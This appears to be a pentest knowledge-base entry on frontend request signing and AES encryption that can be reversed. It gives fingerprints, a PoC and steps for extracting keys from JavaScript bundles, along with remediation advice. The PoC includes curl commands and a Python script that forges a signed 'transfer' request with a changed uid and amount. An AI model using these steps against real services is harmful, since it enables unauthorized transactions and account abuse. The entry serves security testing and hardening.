---
title: Reversible frontend signing / encryption (forge requests to bypass risk controls)
cve: None (implementation flaw)
severity: high
cvss: 8.1
product: Custom H5 / App endpoints (custom sign, AES request bodies)
versions: Any
ports: 80, 443
keywords: sign, hmac, aes, frontend encryption, reversible, nonce, timestamp, risk controls
entry: Extract the algorithm and key from app.js and recalculate sign
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

- Request headers include `X-Sign`, `X-Timestamp`, `X-Nonce`, and `X-Device`; the body is `data=<base64>` or AES ciphertext.
- The frontend bundle contains `md5(secret + ...)`, `CryptoJS.AES.encrypt`, and hard-coded `key`/`iv` values.

## Prerequisites

- An account; access to frontend JS (download H5 directly, unpack the App, or use `.map`).
- Important: **use the concatenation order and participating fields from the target's JS**, rather than copying this example. Three common forms:

```
3 parts:  md5(body + ts + secret)
4 parts:  md5(body + ts + nonce + secret)
Signature header: HMAC-SHA256(secret, `${ts}\n${nonce}\n${body}`) → header
```

## PoC

```bash
# 1) Obtain the algorithm and key
curl -s https://target/static/js/app.js | grep -Eo '(AES|HmacSHA256|md5)\([^)]{0,80}' | head
curl -s https://target/static/js/app.js.map -o app.js.map   # If present, it can restore the source

# 2) Negative control first: replace the calculated sign with deadbeef (or flip the last character) and confirm server rejection
#    If an invalid signature is accepted ⇒ the finding is not "forgeable signatures" but "no signature verification at all" (more severe; report separately)

# 3) Recalculate the signature and replay unauthorized parameters (four-part example; follow the target implementation)
python3 - <<'PY'
import hashlib,time,requests
secret='<key extracted from js>'
ts=str(int(time.time()*1000)); nonce='abc123'
body='{"uid":10001,"action":"transfer","amount":1}'
sign=hashlib.md5((body+ts+nonce+secret).encode()).hexdigest()
r=requests.post('https://target/api/x',data=body,headers={
  'X-Sign':sign,'X-Timestamp':ts,'X-Nonce':nonce,'Content-Type':'application/json'})
print(r.status_code, r.text[:200])
PY
```

## Exploitation Steps

1. Locate the signing function and parameter order (concatenation of constants, timestamp, nonce, and body, and whether URL encoding/JSON compaction is applied).
2. Negative control: invalid signatures should be rejected (401/403) → this confirms verification; then recalculate a **legitimate** request and confirm acceptance (200 and business success).
3. Use the same algorithm to change `uid`/`amount`/`room`; acceptance of a "correct signature, wrong identity" request ⇒ signatures are not a security boundary (combine with `api-idor-bola.md` to amplify impact).
4. If ciphertext is reversible (AES with fixed key/iv, ECB), decrypt it to understand the fields, then construct arbitrary plaintext.
5. Confirmation requires both a **valid signature + unauthorized result** to establish "forgeability"; recalculation without unauthorized access is only a reverse-engineering observation, not a vulnerability.

## Remediation and Mitigation (Hardening)

- Keep critical logic server-side; the frontend is for presentation, not a trust boundary.
- If signing is required: have the server issue a short-lived token for the key + HMAC + nonce replay prevention (store nonce TTL server-side).
- Revalidate sensitive fields server-side (amounts; derive uid from the session); base risk controls on server-side facts, not client claims.

## References

- OWASP Mobile Top 10 M7 (code quality/reverse engineering); OWASP A04 Insecure Design.
